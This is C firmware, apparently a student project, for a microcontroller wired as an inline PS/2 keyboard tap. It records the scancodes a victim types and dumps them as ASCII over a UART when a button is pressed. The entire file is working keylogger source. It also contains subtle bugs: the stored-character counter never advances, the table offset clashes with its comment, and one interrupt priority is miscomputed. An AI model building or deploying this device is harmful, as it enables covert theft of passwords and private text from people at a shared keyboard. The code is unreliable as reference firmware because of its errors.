// This is a look up table for basic key strokes. 
// This translates from ps/2 to ascii. 
// The table starts at 0x15, so you should shift 
// the table by 0x15 when you reference it. 
// HI
unsigned char ps2_to_ascii[] = {
	'q','1',0x00,0x00,0x00,'z','s','a','w','2',0x00,

	0x00,'c','x','d','e','4','3',0x00,0x00,' ','v','f','t','r','5',0x00,0x00,
	
	'n','b','h','g','y','6',0x00,0x00,0x00,'m','j','u','7','8',0x00,
	
	0x00,',','k','i','o','0','9',0x00,0x00,'.',0x00,'l','p'};

// Structure to store logged keys
unsigned char logged_keys[255];
	
volatile int RCGCUART    __attribute__((at(0x400FE618)));
volatile int UART1BASE   __attribute__((at(0x4000D000)));
volatile int GPIOBCTL    __attribute__((at(0x4000552C)));
//volatile int UART1DR     __attribute__((at(0x4000D000)));
#define UART1DR              (*((volatile int *)0x4000D000))

volatile int UART1FR     __attribute__((at(0x4000D018)));
volatile int UART1IBRD	__attribute__((at(0x4000D024)));
volatile int UART1FBRD	__attribute__((at(0x4000D028)));
volatile int UART1LCRH	__attribute__((at(0x4000D02C)));
volatile int UART1CTL	    __attribute__((at(0x4000D030)));	
volatile int PB_DATA_R    __attribute__((at(0x400053FC))); 
volatile int PB_GPIOCR_R  __attribute__((at(0x40005524))); 
//#define PB3				(*((volatile int *)0x420A000C))
volatile int PB3        __attribute__((at(0x420A000C)));   // bit banded PB[3]
	// 0x42000000 + 32*byte_offset + 4*bit position = 0x4200000C
  // 0x42000000 + 0x5000 * 32 + 12  = 0x420A000C
volatile int PB_DIR_R   __attribute__((at(0x40005400))); 
volatile int PB_AF_R    __attribute__((at(0x40005420))); 
volatile int PB_AM_R    __attribute__((at(0x40005528))); 
volatile int PB_DEN_R   __attribute__((at(0x4000551C))); 
volatile int PB_IEV_R   __attribute__((at(0x4000540C))); 
volatile int PB_IBE_R   __attribute__((at(0x40005408))); 
volatile int PB_IS_R    __attribute__((at(0x40005404))); 
volatile int PB_IM_R    __attribute__((at(0x40005410))); 
volatile int PB_ICR_R   __attribute__((at(0x4000541C))); 
volatile int PF_DATA_R __attribute__((at(0x400253FC))); 
volatile int PF_DIR_R  __attribute__((at(0x40025400))); 
volatile int PF_AF_R   __attribute__((at(0x40025420))); 
volatile int PF_AM_R   __attribute__((at(0x40025528))); 
volatile int PF_PUR_R   __attribute__((at(0x40025510))); 
volatile int PF_PDR_R   __attribute__((at(0x40025514))); 
volatile int PF_GPIOCR_R   __attribute__((at(0x40025524))); 
volatile int PF_IEV_R   __attribute__((at(0x4002540C))); 
volatile int PF_IBE_R   __attribute__((at(0x40025408))); 
volatile int PF_IS_R   __attribute__((at(0x40025404))); 
volatile int PF_RIS_R   __attribute__((at(0x40025414)));
volatile int PF_IM_R   __attribute__((at(0x40025410))); 
volatile int PF_ICR_R   __attribute__((at(0x4002541C))); 
volatile int PF_DEN_R  __attribute__((at(0x4002551C))); 
volatile int PF_LOCK_R  __attribute__((at(0x40025520))); 
volatile int RCGC2_R   __attribute__((at(0x400FE108))); //value for RCGC2 to enable clock for port F
volatile int UART1ENBB_R __attribute__((at(0x421A0600)));  // bitbanded enable bit for UART1
volatile int NVIC_PRI0_R __attribute__((at(0xE000E400)));  // GPIOB
volatile int NVIC_PRI7_R __attribute__((at(0xE000E41C)));  // GPIOF
volatile int NVIC_EN0_R  __attribute__((at(0xE000E100)));  // Enable NVIC interrupts
#define RCGC2_PBF 0x00000022    // Enable Port F and Port B
#define UNLOCK 0x4C4F434B       // Port F unlock


// Declare Global variables here
unsigned short DONTREAD_THIS_HEX = 0;
unsigned short LOGGING = 0;
unsigned char  HEX_DONE = 0;
volatile unsigned char  hex_read_fromKB[100];  // this builds the current 8-bit hex code from PS2 KB
unsigned char  current_bit_read = 0;
unsigned short i = 0;    // index for hex code array read from kb
int countB = 0;
int countF = 0;
int number_of_char_stored = 0;

void GPIOB_Handler(void) {
	PB_ICR_R = 0x04;

	if(LOGGING == 1)
	{
		//  host PC talking to KB, ignore this hex code transmission
		if(PB3 == 1 && countB == 0)
		{
			LOGGING = 0;   // by completely stopping the keylogger
			               // then subsequently will ignore 
			
		}
		
		// make sure the initial byte is zero
		if(countB == 0)
			hex_read_fromKB[number_of_char_stored] = 0x0;
		
		// reads the 8 bits
		if(countB > 0 && countB <=8 && DONTREAD_THIS_HEX != 1)
		{
			// we read in 1 bit at a time sta
		
			hex_read_fromKB[number_of_char_stored] |= PB3 << (countB - 1);
			//hex_read_fromKB[number_of_char_stored] |= (unsigned char)PB3 << (countB - 1);
		}
		
		// If we finished reading a hex code
		// and that hex code is a initial release hex code
		// then we ignore the subsequent second release hex code
		if (hex_read_fromKB[number_of_char_stored] == 0xF0 && countB == 10)
		{
			hex_read_fromKB[number_of_char_stored] = 0x0;
			DONTREAD_THIS_HEX = 1;
			countB = 0;
		} 
		else if(DONTREAD_THIS_HEX == 1 && countB == 10) // we fininshed the second hex release code
		{
			DONTREAD_THIS_HEX = 0;
			countB = 0;
		}
		else
			countB ++;
	

	}
	

	// We are not logging, due to invalid host PC to KB transmission
	if(LOGGING == 0 && countB >= 1)
	{
		if(countB < 12)   // ignore the full TX (8 data bits + parity + stop + ack)
		{
			countB ++;
		}
		// count has hit the ack bit
		else
		{
				countB = 0;
				LOGGING = 1;  // restart logging
		}
	}
	

	
}

void GPIOF_Handler(void) {
	int i = 0;
	// Vectored interrupt - ACK GPIOF[4] and GPIOF[1] flag??  which triggered?
	if(PF_RIS_R & 0x10) {   // SW1 (left button) is start logging button
		PF_ICR_R = 0x10;     
	   // Do something for switch 1 (start keylogging)
		// (start keylogging)
		LOGGING = 1;
	}
	if(PF_RIS_R & 0x1) {    // SW2 (rt button) is stop logging and output to UART1
		PF_ICR_R = 0x1;     
	   // Do something for switch 2  (stop keylogging)
		// Dump what we logged to UART1
		
		LOGGING = 0;
		for(i = 0; i < number_of_char_stored; i ++)
		{
			while((UART1FR & 0x0020) != 0);
			UART1DR = ps2_to_ascii[hex_read_fromKB[i] - 15];
		}
		
	}
}

void INIT(void) {
	// UART1 Clock
	RCGCUART |= 0x2;  // Uart clock
	// GPIO Clock
	RCGC2_R |= RCGC2_PBF;    // enable clocks
	
	// Initialize Global variables here  

	LOGGING = 0;
	
	// Unlock Port F
	PF_LOCK_R = UNLOCK;

	// GPIOCR
	PF_GPIOCR_R |= 0x1F;  // allow changes to GPIOF[4:0] incl LEDs for testing
	PF_GPIOCR_R |= 0x11;  // allow changes to GPIOF[4] and [0] for AFSEL, DEN
	PB_GPIOCR_R |= 0xF;   // allow changes to GPIOB[3:0] for AFSEL, DEN
	// Port B  GPIODIR
	// [1:0] are outputs, [3:2] are inputs
	PB_DIR_R &= ~0xC;
	// Pull-Up resistors on switches
	PF_PUR_R |= 0x11;  
	PF_PDR_R |= 0xE;    // pulls down all three LEDs
	// Port F  [4] and [0] are inputs
	PF_DIR_R &= ~0x11;   // this clears PF[4] PF[0] as inputs
	PF_DIR_R |= 0xE;     // sets PF[3:1] as outputs   
	// Disable alternative function
	PF_AF_R &= ~0x1F;   // for LEDs
	
	// AMSEL
	PF_AM_R &= ~0x1F;   // for LEDs
	
	// Digital Enable
	PF_DEN_R |= 0x1F;   // for LEDs
	
	
	PB_AM_R &= ~0xF;    // disable alternative mode for PB[3:0]
	PB_AF_R |= 0x3;      // for PB[1:0], the UART1 pins
  PB_AF_R &= ~0xC;   // for PB[3:2], which are GPIO inputs from kb tap	

// GPIOCTL PMC1 & PMC0 set to 1 to select UART1
	GPIOBCTL = (GPIOBCTL &0xFFFFFF00) + 0x11;

	PB_DEN_R |= 0xF;


	UART1ENBB_R = 0x0;   // disable while configuring UART1 registers
	UART1IBRD |= 0x68;
	UART1FBRD |= 0xB;
	UART1LCRH |= 0x70;
	// UART1CTL |= 0x1;
  UART1ENBB_R = 0x1;  // same as above line

		
	// Initialize INTERRUPTS
	// Level Sense interrupts disabled (we want edge-interrupts)
	PB_IS_R &= ~0x4;
	PF_IS_R &= ~0x11;

	// Not both edges
	PB_IBE_R &= ~0x4;
	PF_IBE_R &= ~0x11;

	// Set Negedge trigger on Port F switches
	PF_IEV_R &= ~0x11;
	
	// Set Negedge trigger on Port B[2] (keyboard clk)
	PB_IEV_R &= ~0x4;
	
	
	// clear flag
	PB_ICR_R = 0x4;
	PF_ICR_R = 0x11;
	
	// arm interrupt
	PF_IM_R |= 0x11;
	PB_IM_R |= 0x4;  // PB[2] only
	
	// set NVIC priority
	NVIC_PRI0_R = (NVIC_PRI0_R&0xFFFF00FF)|0x00004000;     // priority 2 for PB
	NVIC_PRI7_R = (NVIC_PRI0_R&0xFF00FFFF)|0x00200000;   // priority 1 for PF 
	
	// enable NVIC interrupt
	NVIC_EN0_R = 0x40000002;  // PF is 46 (bit30), PB is 17 (bit1)

}






int main(void)
{
	INIT();
	while(1);
	
	return 0;
}
